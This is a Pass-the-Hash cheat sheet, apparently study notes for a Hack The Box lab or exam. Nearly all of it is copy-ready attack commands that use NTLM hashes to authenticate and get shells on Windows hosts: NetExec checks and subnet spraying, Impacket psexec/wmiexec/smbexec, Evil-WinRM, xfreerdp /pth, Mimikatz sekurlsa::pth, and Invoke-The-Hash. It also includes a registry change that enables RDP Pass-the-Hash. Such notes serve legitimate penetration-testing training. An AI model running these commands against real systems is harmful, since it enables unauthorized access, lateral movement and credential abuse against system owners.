## Pass the Hash (PtH) — Cheat Sheet

> [!ABSTRACT] What it is  
> Authenticate using **NTLM hash** instead of plaintext password.

Requirements:

- Valid **NTLM hash**
    
- Target allows **NTLM auth**
    
- Usually **admin rights** on target
    

Hash format:

```text
LMHASH:NTHASH
:NTHASH
```

Example:

```text
:30B3783CE2ABF1AF70F77D0660CF3453
```

---

# > [!INFO] Where hashes come from

- SAM dump
    
- LSASS memory
    
- NTDS.dit
    
- secretsdump
    
- mimikatz
    

---

# > [!SUCCESS] Linux PtH

## NetExec auth test

```bash
nxc smb 10.129.201.126 \
-u Administrator \
-d . \
-H 30B3783CE2ABF1AF70F77D0660CF3453
```

**(Pwn3d!)** = local admin

---

## NetExec execute command

```bash
nxc smb 10.129.201.126 \
-u Administrator \
-d . \
-H 30B3783CE2ABF1AF70F77D0660CF3453 \
-x whoami
```

---

## Spray local admin hash

```bash
nxc smb 172.16.1.0/24 \
-u Administrator \
-d . \
-H HASH \
--local-auth
```

Find password reuse fast.

---

## Impacket PsExec

```bash
impacket-psexec administrator@10.129.201.126 \
-hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Interactive SYSTEM shell.

---

## Impacket WMIExec

```bash
impacket-wmiexec administrator@10.129.201.126 \
-hashes :HASH
```

Stealthier than psexec.

---

## Impacket SMBExec

```bash
impacket-smbexec administrator@10.129.201.126 \
-hashes :HASH
```

---

## Evil-WinRM

```bash
evil-winrm \
-i 10.129.201.126 \
-u Administrator \
-H 30B3783CE2ABF1AF70F77D0660CF3453
```

PowerShell shell.

---

## xFreeRDP (GUI access)

```bash
xfreerdp \
/v:10.129.201.126 \
/u:julio \
/pth:64F12CDDAA88057E06A81B54E73B949B
```

Needs **Restricted Admin Mode enabled**

---

# > [!INFO] Enable RDP PtH

On target:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa \
/t REG_DWORD \
/v DisableRestrictedAdmin \
/d 0x0 /f
```

---

# > [!SUCCESS] Windows PtH

## Mimikatz spawn shell

```cmd
mimikatz.exe privilege::debug ^
"sekurlsa::pth /user:julio /rc4:HASH /domain:inlanefreight.htb /run:cmd.exe" exit
```

Spawns shell as target user.

---

## Mimikatz local account

```cmd
sekurlsa::pth /user:Administrator /rc4:HASH /domain:.
```

---

## Invoke-The-Hash SMBExec

```powershell
Invoke-SMBExec `
-Target 172.16.1.10 `
-Domain inlanefreight.htb `
-Username julio `
-Hash HASH `
-Command "whoami"
```

---

## Invoke-WMIExec

```powershell
Invoke-WMIExec `
-Target DC01 `
-Domain inlanefreight.htb `
-Username julio `
-Hash HASH `
-Command "whoami"
```

---

# > [!CHECK] Fast Workflow

## 1. Test hash

```bash
nxc smb target -u user -H HASH
```

---

## 2. Confirm admin

Look for:

```text
(Pwn3d!)
```

---

## 3. Execute

```bash
nxc smb target -u user -H HASH -x whoami
```

---

## 4. Upgrade shell

```bash
evil-winrm -i target -u user -H HASH
```

or

```bash
impacket-psexec user@target -hashes :HASH
```

---

# > [!WARNING] Common Failure Reasons

## STATUS_LOGON_FAILURE

Wrong:

- hash
    
- username
    
- domain
    

---

## Access denied

User authenticated but **not admin**

---

## RDP fails

Restricted Admin Mode disabled

---

## Local account blocked

UAC token filtering

---

# > [!TLDR] HTB Default Commands

## Fastest check

```bash
nxc smb target -u Administrator -H HASH
```

---

## Fast command exec

```bash
nxc smb target -u Administrator -H HASH -x whoami
```

---

## Best shell

```bash
evil-winrm -i target -u Administrator -H HASH
```

---

## Full interactive

```bash
impacket-psexec administrator@target -hashes :HASH
```

**Exam shortcut:**  
Start with **NetExec** → if **Pwn3d!** → move to **evil-winrm** or **psexec**.